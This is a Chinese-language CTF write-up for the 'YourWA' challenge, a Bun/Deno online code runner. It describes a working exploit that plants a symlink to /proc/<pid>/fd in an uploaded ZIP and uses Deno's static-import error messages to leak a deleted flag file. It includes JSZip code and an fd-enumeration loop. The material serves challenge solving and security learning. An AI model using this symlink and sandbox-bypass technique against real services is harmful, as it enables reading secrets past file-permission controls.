# YourWA

## 题目简述

题目是 Bun 写的在线运行 JS/TS 的服务，实际执行使用 Deno。服务启动时会创建 `flag.txt`，用 `fs.openSync('./flag.txt', 'r')` 保留读句柄，然后删除文件。

源码关键逻辑：

```ts
await import('node:fs').then(async fs => {
    await $`./mkflag $(whoami) "$ICQ_FLAG"`.quiet()
    fs.openSync('./flag.txt', 'r')
    await $`./rmflag`.quiet()
})
```

`/status` 会返回服务 PID，`/api/upload` 接收 ZIP 并解压到临时目录，`/api/run/<uuid>` 运行入口文件。

## 解题过程

### 关键机制

Deno 默认禁用文件读取权限，普通 `Deno.readTextFile` 不可用。但静态 `import` 不走同一套文件读 API，如果导入目标不是 JS/TS 模块，Deno 会在错误信息中带出被导入文件的内容或解析信息。

上传 ZIP 时，服务只校验入口文件的真实路径在临时目录内，并未禁止 ZIP 中的 symlink。于是可把 `symlink.ts` 做成指向 `/proc/<pid>/fd/<fd>` 的软链接，再由入口文件 `import './symlink.ts'` 触发 Deno 报错泄露。

### 求解步骤

先访问 `/status` 获取 PID。然后枚举 fd，构造带 symlink 的 ZIP：

```js
function createSymlinkZip(pid, fd) {
    const zip = new JSZip();
    zip.file('symlink.ts', `/proc/${pid}/fd/${fd}`, {
        unixPermissions: 0o755 | 0o120000
    });
    zip.file('vuln.ts', "import './symlink.ts';\n");
    return zip;
}
```

上传 ZIP，入口设置为 `vuln.ts`，再调用 `/api/run/<uuid>`。当枚举到保存 flag 的 fd 时，`stderr` 中会出现 flag。

完整流程：

```text
GET /status -> pid
for fd in 6..20:
  create symlink.ts -> /proc/<pid>/fd/<fd>
  upload zip with entry vuln.ts
  run uploaded entry
  check stderr for WMCTF{...}
```

## 方法总结

- 源码关键点：`fs.openSync` 保留已删除文件的 fd，flag 仍可经 `/proc/<pid>/fd` 读取。
- 沙箱绕过：Deno 禁止普通文件读，但静态 import 的错误信息可作为文件内容侧信道。
- 上传点缺陷：解压 ZIP 未处理 symlink，路径检查没有覆盖软链接最终目标。
